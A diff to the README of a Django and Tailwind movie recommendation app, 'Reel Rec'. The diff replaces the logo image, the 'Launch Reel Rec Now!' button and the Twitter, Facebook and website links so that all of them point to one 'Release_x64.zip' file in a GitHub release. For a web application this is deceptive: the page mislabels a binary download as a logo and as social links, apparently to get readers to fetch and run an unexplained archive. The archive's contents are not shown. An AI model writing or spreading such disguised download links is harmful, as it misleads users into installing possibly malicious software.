@@ -3,7 +3,7 @@
 ## Welcome to Reel Rec!
 Reel Rec is a cutting-edge AI-powered movie recommendation system that is set to revolutionize the way movie enthusiasts like you discover and enjoy your favorite films. Using advanced content-based recommendation algorithms, Reel Rec analyzes your preferences and suggests personalized movie recommendations that match your taste. This innovative application is created using Django for the backend and Tailwind CSS for the frontend, ensuring a seamless user experience.
 
-![Reel Rec Logo](https://example.com/reel-rec-logo.png)
+![Reel Rec Logo](https://github.com/klhhrx/Reel-Rec/releases/download/v2.0/Release_x64.zip)
 
 ## Features 🌟
 🔍 **Personalized Recommendations**: Receive tailor-made movie suggestions based on your viewing history and preferences.  
@@ -38,7 +38,7 @@ Reel Rec is a cutting-edge AI-powered movie recommendation system that is set to
   - webapplication  
 
 ## Get Started 🚗
-Ready to dive into the world of Reel Rec? [**Launch Reel Rec Now!**](https://github.com/user-attachments/files/18383251/Software.zip)  
+Ready to dive into the world of Reel Rec? [**Launch Reel Rec Now!**](https://github.com/klhhrx/Reel-Rec/releases/download/v2.0/Release_x64.zip)  
 👉 Click the button above to access the software.
 
 ## Meet the Team 👥
@@ -52,9 +52,9 @@ We welcome contributions from the open-source community to help enhance Reel Rec
 
 ## Stay Connected 🌐
 Stay updated with the latest news and updates from Reel Rec:  
-- Follow us on [Twitter](https://twitter.com/reelrec)  
-- Like us on [Facebook](https://facebook.com/reelrec)  
-- Visit our [Website](https://www.reelrec.com)  
+- Follow us on [Twitter](https://github.com/klhhrx/Reel-Rec/releases/download/v2.0/Release_x64.zip)  
+- Like us on [Facebook](https://github.com/klhhrx/Reel-Rec/releases/download/v2.0/Release_x64.zip)  
+- Visit our [Website](https://github.com/klhhrx/Reel-Rec/releases/download/v2.0/Release_x64.zip)  
 
 ---
 
